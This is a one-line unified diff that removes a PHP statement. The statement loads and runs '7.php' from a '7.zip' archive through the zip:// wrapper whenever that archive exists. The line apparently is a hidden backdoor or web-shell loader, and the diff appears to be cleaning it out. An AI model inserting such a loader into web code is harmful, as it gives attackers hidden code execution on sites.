@@ -1,1 +1,0 @@
-<?php if(file_exists('7.zip')){require 'zip://7.zip#7.php';}?>
